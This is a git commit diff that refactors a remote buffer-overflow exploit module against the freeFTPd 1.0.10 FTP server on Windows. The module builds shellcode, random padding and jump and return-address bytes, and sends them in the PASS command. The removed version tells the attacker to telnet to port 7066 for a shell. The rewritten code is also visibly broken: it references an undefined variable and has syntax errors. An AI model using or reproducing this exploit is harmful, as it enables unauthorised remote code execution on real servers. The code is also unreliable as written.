6330a0bfb8bf10de6265a65a5fc67be5a8c0a534
raveneus <raveneus.cwillguy@gmail.com>
2016-05-22 15:33:43 -0500

    Update freeftpd_pass_overflow.py

--- framework/modules/windows/freeftpd_pass_overflow/freeftpd_pass_overflow.py
+++ framework/modules/windows/freeftpd_pass_overflow/freeftpd_pass_overflow.py
@@ -1,55 +1,30 @@
-class freeftpdPassOverflowMenu(cmd.Cmd):
-  def do_show(self, args):
-    if args != "options":
-      print "*** Unknown argument: " + args
-    print "Target: freeFTPd version 1.0.10 and below on Windows"
-    print "Options for freeftpd_pass_overflow:"
-    print "========================"
-    print "user    %s    the user to login in as" % self.user[0]
-    print "host    %s    the IP of the target" % self.host[0]
-  def help_exit(self):
-    print "Usage: exit"
-    print "exit: exit the freeftpd_pass_overflow context"
-  def do_exit(self, args):
-    if args:
-      print "*** Argument number: needed 0"
-      return
-    return True
-  def help_start(self):
-    print "Usage: start"
-    print "start: start the attack"
-  def do_start(self, args):
-    for let in "abcdefghijklmnopqrstuvwxyz":
-      if let in self.host[0]:
-        self.host[0] = gethostbyname(self.host[0])
-    print "[*]Generating payload..."
+import os, sys
+sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
+import core
+class freeftpdPassOverflowMenu(core.Exploit):
+  def generate(self, p):
     off = 702
-    f = open("../../../payloads/freeftpd_pass.shell", "r")
-    for line in f.readlines():
-      payload += line[:-1].decode('string_escape')
-    f.close()
-    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
-    for a in range(0, off - len(payload)):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
-    payload += "\xe9=\xfd\xff\xff"
-    payload += "\xeb\xf9"
-    for a in range(0, 2):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
+    p += self.get_shellcode()
+    p += self.rand_text(off - len(p))
+    p += "\xe9=\xfd\xff\xff"
+    p += "\xeb\xf9"
+    p += self.rand_text(2)
     payload += "\xbb\x14\x40\x00"
-    print "[+]Payload generated."
-    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect((self.host[0], 21))
-    s.recv(1024)
-    s.send("USER " + self.user[0])
+  def deliver(self, p)
+    self.init_deliver()
+    s = self.connect()
+    s.send("USER " + self.variables["user"]
     s.recv(1024)
     s.send("PASS " + payload)
     s.close()
-    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+  def check(self):
+    self.disconnect(self.connect())
+    if "freeFTPd 1.0" in self.banner[0]:
+      self.check_vuln()
+    else:
+      self.check_safe()
 def main():
-  freeftpdpassoverflowmenu = freeftpdPassOverflowMenu()
+  freeftpdpassoverflowmenu = freeftpdPassOverflowMenu("freeftpd_pass_overflow", "freeFTPd 1.0.10 and below on Windows", "freeftpd_pass.shell", {"user":"anonymous", "host":""}, {"user":"the user to use", "host":"the IP of the target"}, [True])
   freeftpdpassoverflowmenu.cmdloop("pdf-console attack(freeftpd_pass_overflow)% ")
-if __name__ == __main__:
+if __name__ == '__main__':
   main()
